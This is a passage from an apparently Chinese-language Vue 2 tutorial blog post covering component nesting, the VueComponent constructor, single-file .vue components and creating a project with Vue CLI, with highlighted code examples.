<li>定义组件时，可以使用<code>name</code>配置项指定组件在开发者工具中呈现的名字<ul>
<li>一般第三方组件库会这么做</li>
<li>大型项目开发时，避免组件错乱</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>关于组件标签</p>
<ul>
<li>第一种写法：<code>&lt;school&gt;&lt;/school&gt;</code></li>
<li>第二种写法：<code>&lt;school/&gt;</code></li>
<li>备注：没有用脚手架时，第二种写法<code>&lt;school/&gt;</code>会导致后续组件不能被渲染</li>
</ul>
</li>
<li><p>定义组件的简写方式：</p>
<pre><code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> school = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(options)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简写</span></span><br><span class="line"><span class="keyword">const</span> shool = options</span><br></pre></td></tr></table></figure>
</code></pre>
<ul>
<li>注册组件时，底层做了一个判断，如果<code>components</code>传入的是一个对象，会帮我们调用<code>Vue.extend()</code>的</li>
</ul>
</li>
</ul>
<h3 id="2-2-5-组件的嵌套"><a href="#2-2-5-组件的嵌套" class="headerlink" title="2.2.5.组件的嵌套"></a>2.2.5.组件的嵌套</h3><p>标准化开发时，<code>vm</code>下应该要有一个<code>app</code>组件，类似丞相的角色，并且可以将<code>app</code>组件标签的调用，写在<code>vm</code>的<code>template</code>配置项中，使得容器中没有任何代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    Vue.config.productionTip = false</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    const student = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        data() &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                name: &#x27;student&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        template: `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    const school = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        data() &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                name: &#x27;school&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        components: &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            student</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        template: `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    const app = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        components: &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            school</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    const vm = new Vue(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        el: &#x27;#root&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        components: &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            app</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        template: `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">app</span>&gt;</span><span class="tag">&lt;/<span class="name">app</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526064037998.png" alt="image-20220526064037998"></p>
<h3 id="2-2-6-VueComponent构造函数"><a href="#2-2-6-VueComponent构造函数" class="headerlink" title="2.2.6.VueComponent构造函数"></a>2.2.6.<code>VueComponent</code>构造函数</h3><ul>
<li><p><code>school</code>组件本质上是一个名为<code>VueComponent</code>的构造函数，且不是程序员定义的，是<code>Vue.extend</code>生成的</p>
</li>
<li><p>我们只需要写<code>&lt;school&gt;&lt;/school&gt;或者&lt;school/&gt;</code>，<code>Vue</code>解析时会帮我们创建<code>school</code>组件的实例对象，即<code>Vue</code>帮我们执行的<code>new VueComponent(options)</code></p>
</li>
<li><p>特别注意：每次调用<code>Vue.extend</code>，返回的都是一个全新的<code>VueComponent</code></p>
</li>
<li><p>关于<code>this</code>指向</p>
<ul>
<li>组件配置中<ul>
<li><code>data</code>函数、<code>methods</code>中的函数、<code>watch</code>中的函数、<code>computed</code>中的函数，它们的<code>this</code>指向均是**<code>VueComponent</code>**</li>
</ul>
</li>
<li><code>new Vue()</code>配置中<ul>
<li><code>data</code>函数、<code>methods</code>中的函数、<code>watch</code>中的函数、<code>computed</code>中的函数，它们的<code>this</code>指向均是**<code>Vue实例</code>**</li>
</ul>
</li>
</ul>
</li>
<li><p><code>VueComponent</code>的实例对象，以后简称<code>vc</code>，也可以称为组件实例对象；<code>Vue</code>的实例对象，以后简称<code>vm</code></p>
<ul>
<li><p><code>vm</code>实例上有<code>$children</code>属性，值是每个<code>vc</code>实例</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526072955018.png" alt="image-20220526072955018"></p>
</li>
</ul>
</li>
</ul>
<h3 id="2-2-7-Vue实例与组件实例"><a href="#2-2-7-Vue实例与组件实例" class="headerlink" title="2.2.7.Vue实例与组件实例"></a>2.2.7.<code>Vue</code>实例与组件实例</h3><p>注意区分<code>VUe</code>实例和组件实例的区别（之前讲过）</p>
<p>组件是可复用的实例</p>
<p>因为组件是可复用的实例，所以它们与<code>new Vue()</code>接收相同的选项，例如<code>data</code>、<code>computed</code>、<code>watch</code>、<code>methods</code>以及生命周期钩子等，仅有的例外是像<code>el</code>这样根实例特有的选项</p>
<p>组件配置项中的<code>data</code>必须是一个函数，因此每个实例可以维护一份被返回对象的独立拷贝</p>
<h3 id="2-2-8-一个重要的内置关系"><a href="#2-2-8-一个重要的内置关系" class="headerlink" title="2.2.8.一个重要的内置关系"></a>2.2.8.一个重要的内置关系</h3><p><code>VueComponent.prototype.__proto__ === Vue.prototype</code></p>
<p>为什么要有这个关系：让组件实例对象（<code>vc</code>）可以访问到<code>Vue</code>原型上的属性、方法</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526144955027.png" alt="image-20220526144955027"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> d = <span class="keyword">function</span> <span class="title function_">Demo</span>(<span class="params"></span>)</span><br></pre></td></tr></table></figure>

<p><code>Demo.prototype === d.__proto__</code></p>
<ul>
<li>显示原型属性：<code>Demo.prototype</code></li>
<li>隐式原型属性：<code>d.__proto__</code></li>
</ul>
<h2 id="2-3-单文件组件"><a href="#2-3-单文件组件" class="headerlink" title="2.3.单文件组件"></a>2.3.单文件组件</h2><p><code>*.vue</code>就是一个单文件组件，但浏览器肯定不能直接运行的</p>
<p>借助：<code>webpack</code>或<code>vue-cli</code>（搭建好的<code>webpack</code>的环境）</p>
<p>一般命名采取大写</p>
<p><code>School.vue</code></p>
<p>组件：实现局部（特定）功能效果的代码集合</p>
<p>为了符合上述描述，一个<code>.vue</code>文件应该包含<code>html/css/js</code>，分别对应<code>template/style/script</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;!-- 组件的结构 --&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	// 组件交互相关的代码（数据、方法等）</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">	/* 组件的样式 */</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;!-- 组件的结构 --&gt;</span><br><span class="line">	&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">		&lt;h2&gt;</span><br><span class="line">        	名称：&#123;&#123;name&#125;&#125;    </span><br><span class="line">    	&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	// 组件交互相关的代码（数据、方法等）</span><br><span class="line">    const school = Vue.extend(&#123;</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">	/* 组件的样式 */</span><br><span class="line">    .demo&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>注意：<code>script</code>的<code>js</code>部分要用模块化的写法，一般来说采取默认暴露的写法，引入的时候比较方便</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	// 组件交互相关的代码（数据、方法等）</span><br><span class="line">    const school = Vue.extend(&#123;</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    export default school</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>简写变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	// 组件交互相关的代码（数据、方法等）</span><br><span class="line">    </span><br><span class="line">    export default Vue.extend(&#123;</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>省略<code>extend</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	// 组件交互相关的代码（数据、方法等）</span><br><span class="line">    export default &#123;</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>完整写法：</p>
<p><code>School.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;!-- 组件的结构 --&gt;</span><br><span class="line">	&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">		&lt;h2&gt;</span><br><span class="line">        	名称：&#123;&#123;name&#125;&#125;    </span><br><span class="line">    	&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;School&#x27;, // 一般定义name属性，和文件名一致</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">	/* 组件的样式 */</span><br><span class="line">    .demo&#123;</span><br><span class="line">        background-color: orange;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>创建<code>Student</code>和<code>App</code>组件</p>
<p>在<code>App</code>组件中引入组件</p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;School/&gt;</span><br><span class="line">        &lt;Student/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    // 引入组件</span><br><span class="line">    import School from &#x27;./School&#x27; // 如果是在脚手架中，可以省略后缀</span><br><span class="line">    import Student from &#x27;./Student&#x27;</span><br><span class="line">    </span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;App&#x27;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            School,</span><br><span class="line">            Student</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>所有的组件都是受<code>vm</code>管理的，此时我们应该怎么创建<code>vm</code>呢？</p>
<p>可以新建一个<code>main.js</code>入口文件</p>
<p><code>main.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&quot;#root&quot;</span>,</span><br><span class="line">    <span class="attr">components</span>:&#123;</span><br><span class="line">        <span class="title class_">App</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">template</span>: <span class="string">&#x27;&lt;App/&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>还有一个问题，现在没有容器，我们还需要创建<code>index.html</code></p>
<p><code>index.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>整体形式如上，但不能在浏览器上运行</p>
<p>在脚手架环境中可以直接运行</p>
<h1 id="3-使用Vue脚手架"><a href="#3-使用Vue脚手架" class="headerlink" title="3.使用Vue脚手架"></a>3.使用<code>Vue</code>脚手架</h1><h2 id="3-1-说明"><a href="#3-1-说明" class="headerlink" title="3.1.说明"></a>3.1.说明</h2><ul>
<li><code>Vue</code>脚手架时<code>Vue</code>官方提供的标准化开发工具：<a target="_blank" rel="noopener" href="https://cli.vuejs.org/zh/guide/">介绍 | Vue CLI (vuejs.org)</a></li>
<li>脚手架开发工具的版本，一般选择最新的即可，是向下兼容的<ul>
<li>不要选择新的技术版本，却选择了旧的开发工具版本</li>
</ul>
</li>
</ul>
<h2 id="3-2-具体步骤"><a href="#3-2-具体步骤" class="headerlink" title="3.2.具体步骤"></a>3.2.具体步骤</h2><p>如何创建<code>Vue</code>项目</p>
<ul>
<li>安装<code>nodejs</code></li>
<li>创建新目录并进入，习惯性的<code>npm init -y</code>一下，创建一个空的<code>package.json</code><ul>
<li>安装<code>vue-cli</code>：<code>npm i @vue/cli</code></li>
<li><code>20220511</code>默认安装的脚手架版本为<code>5.0.4</code></li>
<li>这个默认是安装在本地的，调用指令时需要使用<code>npx</code>前缀，如果是全局安装的则不需要</li>
</ul>
</li>
<li>创建<code>vue</code>项目：<code>npx vue create project-name</code>或<code>vue create project-name</code><ul>
<li>然后选择是<code>vue2</code>还是<code>vue3</code>的项目</li>
<li>根据提示启动项目：<code>npm run serve</code></li>
</ul>
</li>
<li>备注：<ul>
<li>如果出现下载慢，可以配置淘宝镜像：<code>npm config set registry https://registry.npm.taobao.org</code><ul>
<li>现在已经重定向到<code>https://registry.npmmirror.com/</code>了</li>
</ul>
</li>
<li><code>Vue</code>脚手架隐藏了所有<code>webpack</code>相关的配置，若想查看具体的<code>webpack</code>配置，可以执行：<code>vue inspect &gt; output.js</code></li>
</ul>
</li>
</ul>
<h2 id="3-3-脚手架目录结构"><a href="#3-3-脚手架目录结构" class="headerlink" title="3.3.脚手架目录结构"></a>3.3.脚手架目录结构</h2><p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526154714988.png" alt="image-20220526154714988"></p>
<p>主要目录：<code>src</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526155027939.png" alt="image-20220526155027939"></p>
<p>入口文件：<code>main.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span> <span class="comment">// 引入Vue</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span> <span class="comment">// 引入附属组件</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">// 关闭生产提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例对象vm</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>), <span class="comment">// render函数作用：将App组件放入容器中</span></span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>) <span class="comment">// 获取容器</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>assets</code>一般放静态资源</p>
<p>那么依赖的那个<code>html</code>文件在那儿呢？在<code>public</code>目录下</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526160049268.png" alt="image-20220526160049268"></p>
<p><code>index.html</code></p>
<ul>
<li><code>BASE_URL</code>：正式打包到服务器后，<code>BASE_URL</code>指向的是<code>public</code>所在的路径</li>
<li><code>title</code>：引用了<code>webpack</code>插件里的配置作为标题</li>
<li><code>noscript</code>：浏览器不支持<code>js</code>时，将会提示</li>
<li>容器：<code>&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</code></li>
</ul>
